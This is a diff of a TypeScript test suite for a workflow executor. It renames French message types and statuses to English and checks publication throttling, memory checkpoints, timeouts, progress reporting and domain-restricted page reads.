+    expect(r2.run.blocks.map((x) => x.status)).toEqual(["succeeded", "succeeded", "failed", "not-run"]);
+    expect(relayees2).not.toContainEqual(expect.objectContaining({ block: "avis", step: "end" }));
 
     // Without auFilDeLEau: two debut in a row, the second is rejected as today.
     const without = await bench(watch(), {}, {
@@ -1351,11 +1351,11 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
         blockStart("liste"), blockEnd("liste"),
         blockStart("fiche"), blockStart("avis"),
         blockEnd("fiche"), blockEnd("avis"),
-        { t: "fin", data: [] },
+        { t: "end", data: [] },
       ]),
     });
     const r3 = await runWorkflow(without.ctx, without.infra);
-    expect(r3.run.blocks.map((x) => x.status)).toEqual(["reussi", "reussi", "pas-lance", "pas-lance"]);
+    expect(r3.run.blocks.map((x) => x.status)).toEqual(["succeeded", "succeeded", "not-run", "not-run"]);
 
     // A trial has no chain: same rejection.
     const e = await bench(watch({ live: true }), {}, {
@@ -1363,12 +1363,12 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
         blockStart("liste"), blockEnd("liste"),
         blockStart("fiche"), blockStart("avis"),
         blockEnd("fiche"), blockEnd("avis"),
-        { t: "fin", data: [] },
+        { t: "end", data: [] },
       ]),
     });
     attempt(e);
     const r4 = await runWorkflow(e.ctx, e.infra);
-    expect(r4.run.blocks.map((x) => x.status)).toEqual(["reussi", "reussi", "pas-lance", "pas-lance"]);
+    expect(r4.run.blocks.map((x) => x.status)).toEqual(["succeeded", "succeeded", "not-run", "not-run"]);
   });
 
   it("publication relayed only during the chain and 5 s apart; ignored before the chain, for a trial, without auFilDeLEau, beyond 2 MB", async () => {
@@ -1390,7 +1390,7 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
       blockEnd("avis"),
       advance(5000), pub("après la chaîne", 3, 3),
       blockStart("sortie"), blockEnd("sortie"),
-      { t: "fin", data: "finale" },
+      { t: "end", data: "finale" },
     ];
     const launchWith = async (workflow: unknown, set: (b: Bench) => void = () => {}) => {
       const b = await bench(workflow);
@@ -1402,7 +1402,7 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
         relayed.push(p);
       };
       const r = await runWorkflow(b.ctx, b.infra);
-      expect(r.issue).toMatchObject({ t: "fin", output: { value: "finale" } });
+      expect(r.issue).toMatchObject({ t: "end", output: { value: "finale" } });
       return relayed;
     };
 
@@ -1422,7 +1422,7 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
       blockStart("liste"), blockEnd("liste"), blockStart("fiche"), blockStart("avis"),
       pub("A", 1, 2), advance(5000), pub("B", 2, 2),
       blockEnd("fiche"), blockEnd("avis"), blockStart("sortie"), blockEnd("sortie"),
-      { t: "fin", data: "finale" },
+      { t: "end", data: "finale" },
     ]);
     const finished: unknown[] = [];
     let running = 0;
@@ -1437,15 +1437,15 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
     const r = await runWorkflow(b.ctx, b.infra);
     expect(finished).toEqual(["A", "B"]);
     expect(atMost).toBe(1);
-    expect(r.issue).toMatchObject({ t: "fin", output: { value: "finale" } });
+    expect(r.issue).toMatchObject({ t: "end", output: { value: "finale" } });
   });
 
   it("progressive: surMemoire at most every 30 s; an echec carries the last memory received; non-progressive: neither surMemoire nor memoire in the outcome", async () => {
     // The hash of the validated parameters (defaults included) of the liste block.
     const hash = paramsHash(valid(watch()).workflow.blocks.find((x) => x.id === "liste")!.params);
-    const m = (n: number) => ({ t: "memoire", memory: { list: { type: "code", value: n }, unknown: { type: "code", value: n } } });
-    const marquee = (n: number) => ({ list: { type: "code", value: n, hash: hash } });
-    const launchWith = async (d: number | undefined, end: unknown = { t: "echec", error: "cassé" }) => {
+    const m = (n: number) => ({ t: "memory", memory: { liste: { type: "code", value: n }, unknown: { type: "code", value: n } } });
+    const marquee = (n: number) => ({ liste: { type: "code", value: n, hash: hash } });
+    const launchWith = async (d: number | undefined, end: unknown = { t: "failure", error: "cassé" }) => {
       const b = await bench(watch());
       if (d !== undefined) b.ctx.maxDurationMinutes = d;
       const advance = fakeClock(b);
@@ -1460,15 +1460,15 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
 
     const prog = await launchWith(30);
     expect(prog.relayed).toEqual([marquee(1), marquee(3)]);
-    expect(prog.r.issue).toEqual({ t: "echec", error: "cassé", codeError: true, memory: marquee(4) });
+    expect(prog.r.issue).toEqual({ t: "failure", error: "cassé", codeError: true, memory: marquee(4) });
 
     const without = await launchWith(undefined);
     expect(without.relayed).toEqual([]);
-    expect(without.r.issue).toEqual({ t: "echec", error: "cassé", codeError: true });
+    expect(without.r.issue).toEqual({ t: "failure", error: "cassé", codeError: true });
 
     // A fin keeps the memory as today.
-    const end = await launchWith(30, { t: "fin", data: null });
-    expect(end.r.issue).toMatchObject({ t: "fin", memory: marquee(4) });
+    const end = await launchWith(30, { t: "end", data: null });
+    expect(end.r.issue).toMatchObject({ t: "end", memory: marquee(4) });
   });
 
   it("progressive: a stop (timeout) carries the last memory received; a memory still held (nothing received after) does not count; non-progressive: none", async () => {
@@ -1479,23 +1479,23 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
       if (d !== undefined) b.ctx.maxDurationMinutes = d;
       b.infra.launch = launcherSteps(
         [
-          { t: "memoire", memory: { list: { type: "code", value: 7 } } },
-          { t: "journal", block: "liste", text: "suite" },
+          { t: "memory", memory: { liste: { type: "code", value: 7 } } },
+          { t: "log", block: "liste", text: "suite" },
           // Held until the next line, which never arrives: it could precede a publication never read.
-          { t: "memoire", memory: { list: { type: "code", value: 8 } } },
+          { t: "memory", memory: { liste: { type: "code", value: 8 } } },
         ],
         { blocked: true },
       );
       return (await runWorkflow(b.ctx, b.infra)).issue;
     };
-    expect(await launchWith(30)).toEqual({ t: "arret", status: "erreur", error: "Délai dépassé", memory: { list: { type: "code", value: 7, hash: hash } } });
-    expect(await launchWith(undefined)).toEqual({ t: "arret", status: "erreur", error: "Délai dépassé" });
+    expect(await launchWith(30)).toEqual({ t: "stop", status: "erreur", error: "Délai dépassé", memory: { liste: { type: "code", value: 7, hash: hash } } });
+    expect(await launchWith(undefined)).toEqual({ t: "stop", status: "erreur", error: "Délai dépassé" });
   });
 
   describe("the memory that precedes a publication follows its fate (R34)", () => {
     const hash = () => paramsHash(valid(watch()).workflow.blocks.find((x) => x.id === "liste")!.params);
-    const mem = (n: number) => ({ t: "memoire", memory: { list: { type: "code", value: n } } });
-    const marquee = (n: number) => ({ list: { type: "code", value: n, hash: hash() } });
+    const mem = (n: number) => ({ t: "memory", memory: { liste: { type: "code", value: n } } });
+    const marquee = (n: number) => ({ liste: { type: "code", value: n, hash: hash() } });
     const openChain = [blockStart("liste"), blockEnd("liste"), blockStart("fiche"), blockStart("avis")];
     const launchWith = async (step: (advance: (ms: number) => () => void) => unknown[]) => {
       const b = await bench(watch({ live: true }));
@@ -1516,11 +1516,11 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
         advance(5000), mem(2), pub("x".repeat(2 * 1024 * 1024 + 10), 2, 3),
         // Sent next by the container (verifierMemoire, before echec): it still retains the keys of the rejected publication.
         advance(40_000), mem(3),
-        { t: "echec", error: "cassé" },
+        { t: "failure", error: "cassé" },
       ]);
       expect(r.published).toEqual(["A"]);
       expect(r.memories).toEqual([marquee(1)]);
-      expect(r.issue).toEqual({ t: "echec", error: "cassé", codeError: true, memory: marquee(1) });
+      expect(r.issue).toEqual({ t: "failure", error: "cassé", codeError: true, memory: marquee(1) });
     });
 
     it("a publication accepted after a rejected one puts the memory back on track", async () => {
@@ -1530,20 +1530,20 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
         advance(5000), mem(2), pub("faits > total", 4, 3),
         advance(1000), mem(3), pub("B", 2, 3),
         mem(4),
-        { t: "echec", error: "cassé" },
+        { t: "failure", error: "cassé" },
       ]);
       expect(r.published).toEqual(["A", "B"]);
-      expect(r.issue).toEqual({ t: "echec", error: "cassé", codeError: true, memory: marquee(4) });
+      expect(r.issue).toEqual({ t: "failure", error: "cassé", codeError: true, memory: marquee(4) });
     });
 
     it("two publications in the same stdout chunk: the second is rejected and its memory dropped", async () => {
       const line = (x: unknown) => JSON.stringify(x) + "\n";
       const r = await launchWith(() => [
         ...openChain,
-        line(mem(1)) + line(pub("A", 1, 3)) + line(mem(2)) + line(pub("B", 2, 3)) + line({ t: "echec", error: "cassé" }),
+        line(mem(1)) + line(pub("A", 1, 3)) + line(mem(2)) + line(pub("B", 2, 3)) + line({ t: "failure", error: "cassé" }),
       ]);
       expect(r.published).toEqual(["A"]);
-      expect(r.issue).toEqual({ t: "echec", error: "cassé", codeError: true, memory: marquee(1) });
+      expect(r.issue).toEqual({ t: "failure", error: "cassé", codeError: true, memory: marquee(1) });
     });
 
     it("a fin keeps the last memory received, as before (the output shows everything)", async () => {
@@ -1553,22 +1553,22 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
         advance(1000), mem(2), pub("trop tôt", 2, 3),
         blockEnd("fiche"), blockEnd("avis"), blockStart("sortie"), blockEnd("sortie"),
         mem(3),
-        { t: "fin", data: "finale" },
+        { t: "end", data: "finale" },
       ]);
-      expect(r.issue).toMatchObject({ t: "fin", memory: marquee(3) });
+      expect(r.issue).toMatchObject({ t: "end", memory: marquee(3) });
     });
 
     it("F1: a publication's data is written before the memory it makes safe", async () => {
       const b = await bench(watch({ live: true }));
-      b.infra.launch = launcherSteps([...openChain, mem(1), pub("A", 1, 3), { t: "echec", error: "cassé" }]);
+      b.infra.launch = launcherSteps([...openChain, mem(1), pub("A", 1, 3), { t: "failure", error: "cassé" }]);
       const written: string[] = [];
       b.infra.onPublish = async (p) => {
         await new Promise((ok) => setTimeout(ok, 20));
-        written.push(`donnees ${p.data}`);
+        written.push(`data ${p.data}`);
       };
-      b.infra.onMemory = async (m) => void written.push(`memoire ${m.liste?.value}`);
+      b.infra.onMemory = async (m) => void written.push(`memory ${m.liste?.value}`);
       const r = await runWorkflow(b.ctx, b.infra);
-      expect(written).toEqual(["donnees A", "memoire 1"]);
+      expect(written).toEqual(["data A", "memory 1"]);
       expect(r.issue).toMatchObject({ memory: marquee(1) });
     });
 
@@ -1585,12 +1585,12 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
         const r = await runWorkflow(b.ctx, b.infra);
         return { issue: r.issue, memories: memories };
       };
-      const denied = await launch([...openChain, mem(1), pub("refusee", 1, 3), mem(2), { t: "journal", block: "fiche", text: "x" }, { t: "echec", error: "cassé" }]);
+      const denied = await launch([...openChain, mem(1), pub("refusee", 1, 3), mem(2), { t: "log", block: "fiche", text: "x" }, { t: "failure", error: "cassé" }]);
       expect(denied.memories).toEqual([]);
-      expect(denied.issue).toEqual({ t: "echec", error: "cassé", codeError: true, memory: null });
-      const resume = await launch([...openChain, mem(1), pub("refusee", 1, 3), "avancer", mem(2), pub("B", 2, 3), mem(3), { t: "echec", error: "cassé" }]);
+      expect(denied.issue).toEqual({ t: "failure", error: "cassé", codeError: true, memory: null });
+      const resume = await launch([...openChain, mem(1), pub("refusee", 1, 3), "avancer", mem(2), pub("B", 2, 3), mem(3), { t: "failure", error: "cassé" }]);
       expect(resume.memories).toEqual([marquee(2)]);
-      expect(resume.issue).toEqual({ t: "echec", error: "cassé", codeError: true, memory: marquee(3) });
+      expect(resume.issue).toEqual({ t: "failure", error: "cassé", codeError: true, memory: marquee(3) });
     });
 
     it("a memory after the output block's end, then fin: neither relayed nor safe, it only serves the fin outcome", async () => {
@@ -1600,10 +1600,10 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
         advance(40_000),
         blockEnd("fiche"), blockEnd("avis"), blockStart("sortie"), blockEnd("sortie"),
         mem(2),
-        { t: "fin", data: "finale" },
+        { t: "end", data: "finale" },
       ]);
       expect(r.memories).toEqual([marquee(1)]);
-      expect(r.issue).toMatchObject({ t: "fin", memory: marquee(2) });
+      expect(r.issue).toMatchObject({ t: "end", memory: marquee(2) });
     });
 
     it("a memory followed by fin is not relayed, even without an output end trace", async () => {
@@ -1611,10 +1611,10 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
         ...openChain,
         mem(1), pub("A", 1, 3),
         advance(40_000), mem(2),
-        { t: "fin", data: "finale" },
+        { t: "end", data: "finale" },
       ]);
       expect(r.memories).toEqual([marquee(1)]);
-      expect(r.issue).toMatchObject({ t: "fin", memory: marquee(2) });
+      expect(r.issue).toMatchObject({ t: "end", memory: marquee(2) });
     });
 
     it("a memory after the output block's end, then echec: the outcome keeps the earlier safe memory", async () => {
@@ -1623,27 +1623,27 @@ describe("executerWorkflow: watch (duration, chain, publications, memory along t
         mem(1), pub("A", 1, 3),
         advance(40_000),
         blockEnd("fiche"), blockEnd("avis"), blockStart("sortie"), blockEnd("sortie"),
-        mem(2), { t: "journal", block: "sortie", text: "après" },
-        { t: "echec", error: "cassé" },
+        mem(2), { t: "log", block: "sortie", text: "après" },
+        { t: "failure", error: "cassé" },
       ]);
       expect(r.memories).toEqual([marquee(1)]);
-      expect(r.issue).toEqual({ t: "echec", error: "cassé", codeError: true, memory: marquee(1) });
+      expect(r.issue).toEqual({ t: "failure", error: "cassé", codeError: true, memory: marquee(1) });
     });
   });
 
-  it("interpreteur.mjs's DATA_MAX_SIZE equals the kernel's, re-exported by accueil", async () => {
-    const interpreter = await import(pathToFileURL(join(ENGINE, "interpreteur.mjs")).href);
-    expect(interpreter.TAILLE_MAX_DONNEES).toBe(DATA_MAX_SIZE);
+  it("interpreter.mjs's DATA_MAX_SIZE equals the kernel's, re-exported by accueil", async () => {
+    const interpreter = await import(pathToFileURL(join(ENGINE, "interpreter.mjs")).href);
+    expect(interpreter.DATA_MAX_SIZE).toBe(DATA_MAX_SIZE);
     expect(HOME_DATA_MAX_SIZE).toBe(DATA_MAX_SIZE);
     expect(DATA_MAX_SIZE).toBe(2 * 1024 * 1024);
   });
 
-  it("run.ts's PUBLICATIONS_GAP_MS and MEMORY_GAP_MS equal those of interpreteur.mjs", async () => {
-    const interpreter = await import(pathToFileURL(join(ENGINE, "interpreteur.mjs")).href);
+  it("run.ts's PUBLICATIONS_GAP_MS and MEMORY_GAP_MS equal those of interpreter.mjs", async () => {
+    const interpreter = await import(pathToFileURL(join(ENGINE, "interpreter.mjs")).href);
     expect(PUBLICATIONS_GAP_MS).toBe(5000);
     expect(MEMORY_GAP_MS).toBe(30_000);
-    expect(interpreter.ECART_PUBLICATIONS_MS).toBe(PUBLICATIONS_GAP_MS);
-    expect(interpreter.ECART_MEMOIRE_MS).toBe(MEMORY_GAP_MS);
+    expect(interpreter.PUBLICATIONS_GAP_MS).toBe(PUBLICATIONS_GAP_MS);
+    expect(interpreter.MEMORY_GAP_MS).toBe(MEMORY_GAP_MS);
   });
 });
 
@@ -1675,25 +1675,25 @@ describe("executerWorkflow: input, progress, reads and stop (actions)", () => {
 
   it("a widget's debut line is identical to before (snapshot)", async () => {
     const received: string[] = [];
-    const b = await bench(chain("a"), {}, { launch: launcherLines([{ t: "fin", data: null }], { received: received }) });
+    const b = await bench(chain("a"), {}, { launch: launcherLines([{ t: "end", data: null }], { received: received }) });
     await runWorkflow(b.ctx, b.infra);
     const workflow = JSON.stringify({ blocks: b.ctx.valid.workflow.blocks, links: b.ctx.valid.workflow.links, order: ["a", "sortie"] });
     expect(received.join("").split("\n")[0]).toBe(
-      `{"t":"debut","precedent":null,"maintenant":"2026-10-29T10:00:00.000Z","config":{"interets":"rust"},"workflow":${workflow}}`,
+      `{"t":"start","previous":null,"now":"2026-10-29T10:00:00.000Z","config":{"interests":"rust"},"workflow":${workflow}}`,
     );
   });
 
   it("an action sends saisie and avancement in debut", async () => {
     const received: string[] = [];
     const owners: unknown[] = [];
-    const b = await bench(chain("a"), {}, { launch: launcherLines([{ t: "fin", data: [] }], { received: received }) });
+    const b = await bench(chain("a"), {}, { launch: launcherLines([{ t: "end", data: [] }], { received: received }) });
     b.ctx.owner = { type: "action", id: "leboncoin" };
     b.ctx.input = "clio lyon";
     b.ctx.progress = true;
     b.infra.workshop.harvestCommand = (p, d, m) => (owners.push(p), ["docker", "run", nameOf(p), d, m]);
     const r = await runWorkflow(b.ctx, b.infra);
     const start = JSON.parse(received.join("").split("\n")[0]!);
-    expect(start).toMatchObject({ t: "debut", input: "clio lyon", progress: true });
+    expect(start).toMatchObject({ t: "start", input: "clio lyon", progress: true });
     expect(r.run).toMatchObject({ owner: { type: "action", id: "leboncoin" }, input: "clio lyon" });
     // The workshop receives the whole owner: an action's container has its own name.
     expect(owners).toEqual([{ type: "action", id: "leboncoin" }]);
@@ -1705,7 +1705,7 @@ describe("executerWorkflow: input, progress, reads and stop (actions)", () => {
       chain("a", "b"),
       {
         "a.mjs": `export default async () => 1;`,
-        "b.mjs": `export default async (e, w) => (await w.lirePage("https://gitlab.com/x")).titre;`,
+        "b.mjs": `export default async (e, w) => (await w.readPage("https://gitlab.com/x")).title;`,
       },
       { bridge: bridge },
     );
@@ -1713,41 +1713,41 @@ describe("executerWorkflow: input, progress, reads and stop (actions)", () => {
     const relayed: DirectTrace[] = [];
     b.infra.onTrace = (t) => relayed.push(t);
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toMatchObject({ t: "fin", output: { value: "X" } });
+    expect(r.issue).toMatchObject({ t: "end", output: { value: "X" } });
     expect(relayed).toEqual([
-      { block: "a", step: "debut" },
-      { block: "a", step: "fin", status: "reussi", items: null },
-      { block: "b", step: "debut" },
-      { block: "b", step: "lecture", host: "gitlab.com" },
-      { block: "b", step: "fin", status: "reussi", items: null },
-      { block: "sortie", step: "debut" },
-      { block: "sortie", step: "fin", status: "reussi", items: null },
+      { block: "a", step: "start" },
+      { block: "a", step: "end", status: "succeeded", items: null },
+      { block: "b", step: "start" },
+      { block: "b", step: "read", host: "gitlab.com" },
+      { block: "b", step: "end", status: "succeeded", items: null },
+      { block: "sortie", step: "start" },
+      { block: "sortie", step: "end", status: "succeeded", items: null },
     ]);
   });
 
   it("a refused read (undeclared domain) emits no lecture", async () => {
-    const b = await bench(chain("a"), { "a.mjs": `export default async (e, w) => { try { await w.lirePage("https://tiers.example/"); } catch { return "refusée"; } };` }, { account: ["gitlab.com"], public: [] });
+    const b = await bench(chain("a"), { "a.mjs": `export default async (e, w) => { try { await w.readPage("https://tiers.example/"); } catch { return "refusée"; } };` }, { account: ["gitlab.com"], public: [] });
     const relayed: DirectTrace[] = [];
     b.infra.onTrace = (t) => relayed.push(t);
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toMatchObject({ t: "fin", output: { value: "refusée" } });
-    expect(relayed.some((t) => t.step === "lecture")).toBe(false);
+    expect(r.issue).toMatchObject({ t: "end", output: { value: "refusée" } });
+    expect(relayed.some((t) => t.step === "read")).toBe(false);
   });
 
   it("signal raised: container killed, status interrompue, error ACTION_STOPPED, erreurNoyau", async () => {
     let tue = 0;
     const stop = new AbortController();
-    const b = await bench(chain("a"), {}, { launch: launcherLines([{ t: "bloc", id: "a", step: "debut" }], { blocked: true, killed: () => tue++ }) });
+    const b = await bench(chain("a"), {}, { launch: launcherLines([{ t: "block", id: "a", step: "start" }], { blocked: true, killed: () => tue++ }) });
     b.ctx.owner = { type: "action", id: "gitlab" };
     b.ctx.signal = stop.signal;
     b.infra.onTrace = (t) => {
-      if (t.step === "debut") setImmediate(() => stop.abort());
+      if (t.step === "start") setImmediate(() => stop.abort());
     };
     const r = await runWorkflow(b.ctx, b.infra);
     expect(tue).toBe(1);
-    expect(r.issue).toEqual({ t: "arret", status: "erreur", error: ACTION_STOPPED });
+    expect(r.issue).toEqual({ t: "stop", status: "erreur", error: ACTION_STOPPED });
     expect(r.run).toMatchObject({ status: "interrompue", error: ACTION_STOPPED, kernelError: true });
-    expect(r.run.blocks[0]!.status).toBe("interrompu");
+    expect(r.run.blocks[0]!.status).toBe("interrupted");
     expect(b.deleted).toEqual(["action:gitlab", "action:gitlab"]);
   });
 
@@ -1764,16 +1764,16 @@ describe("executerWorkflow: input, progress, reads and stop (actions)", () => {
   it("an avancement line with faits > total is rejected", async () => {
     const b = await bench(chain("a"), {}, {
       launch: launcherLines([
-        { t: "bloc", id: "a", step: "debut" },
-        { t: "bloc", id: "a", step: "avancement", done: 3, total: 2 },
-        { t: "bloc", id: "a", step: "avancement", done: -1, total: 2 },
-        { t: "bloc", id: "sortie", step: "avancement", done: 1, total: 2 },
-        { t: "bloc", id: "a", step: "avancement", done: 2, total: 2 },
-        { t: "bloc", id: "a", step: "fin", status: "reussi", output: [1, 2] },
-        { t: "bloc", id: "a", step: "avancement", done: 2, total: 2 },
-        { t: "bloc", id: "sortie", step: "debut" },
-        { t: "bloc", id: "sortie", step: "fin", status: "reussi", output: [1, 2] },
-        { t: "fin", data: [1, 2] },
+        { t: "block", id: "a", step: "start" },
+        { t: "block", id: "a", step: "progress", done: 3, total: 2 },
+        { t: "block", id: "a", step: "progress", done: -1, total: 2 },
+        { t: "block", id: "sortie", step: "progress", done: 1, total: 2 },
+        { t: "block", id: "a", step: "progress", done: 2, total: 2 },
+        { t: "block", id: "a", step: "end", status: "succeeded", output: [1, 2] },
+        { t: "block", id: "a", step: "progress", done: 2, total: 2 },
+        { t: "block", id: "sortie", step: "start" },
+        { t: "block", id: "sortie", step: "end", status: "succeeded", output: [1, 2] },
+        { t: "end", data: [1, 2] },
       ]),
     });
     b.ctx.progress = true;
@@ -1781,18 +1781,18 @@ describe("executerWorkflow: input, progress, reads and stop (actions)", () => {
     b.infra.onTrace = (t) => relayed.push(t);
     await runWorkflow(b.ctx, b.infra);
     // Only that of the current block, with faits ≤ total, passes; an avancement outside its block is ignored.
-    expect(relayed.filter((t) => t.step === "avancement")).toEqual([{ block: "a", step: "avancement", done: 2, total: 2 }]);
+    expect(relayed.filter((t) => t.step === "progress")).toEqual([{ block: "a", step: "progress", done: 2, total: 2 }]);
   });
 
-  it("avancement: at most one per PROGRESS_GAP_MS and per block, the last (faits = total) always; ignored without avancement", async () => {
+  it("progress: at most one per PROGRESS_GAP_MS and per block, the last (faits = total) always; ignored without avancement", async () => {
     let t = 0;
     const lignes = [
-      { t: "bloc", id: "a", step: "debut" },
-      ...[1, 2, 3, 4].map((done) => ({ t: "bloc", id: "a", step: "avancement", done: done, total: 4 })),
-      { t: "bloc", id: "a", step: "fin", status: "reussi", output: [] },
-      { t: "bloc", id: "sortie", step: "debut" },
-      { t: "bloc", id: "sortie", step: "fin", status: "reussi", output: [] },
-      { t: "fin", data: [] },
+      { t: "block", id: "a", step: "start" },
+      ...[1, 2, 3, 4].map((done) => ({ t: "block", id: "a", step: "progress", done: done, total: 4 })),
+      { t: "block", id: "a", step: "end", status: "succeeded", output: [] },
+      { t: "block", id: "sortie", step: "start" },
+      { t: "block", id: "sortie", step: "end", status: "succeeded", output: [] },
+      { t: "end", data: [] },
     ];
     const updateEntry = await bench(chain("a"), {}, { launch: launcherLines(lignes) });
     updateEntry.ctx.progress = true;
@@ -1801,7 +1801,7 @@ describe("executerWorkflow: input, progress, reads and stop (actions)", () => {
     const relayed: DirectTrace[] = [];
     updateEntry.infra.onTrace = (x) => relayed.push(x);
     await runWorkflow(updateEntry.ctx, updateEntry.infra);
-    const done = relayed.flatMap((x) => (x.step === "avancement" ? [x.done] : []));
+    const done = relayed.flatMap((x) => (x.step === "progress" ? [x.done] : []));
     expect(done[0]).toBe(1);
     expect(done.at(-1)).toBe(4);
     expect(done.length).toBeLessThan(4);
@@ -1810,6 +1810,6 @@ describe("executerWorkflow: input, progress, reads and stop (actions)", () => {
     const relayees2: DirectTrace[] = [];
     without.infra.onTrace = (x) => relayees2.push(x);
     await runWorkflow(without.ctx, without.infra);
-    expect(relayees2.some((x) => x.step === "avancement")).toBe(false);
+    expect(relayees2.some((x) => x.step === "progress")).toBe(false);
   });
 });
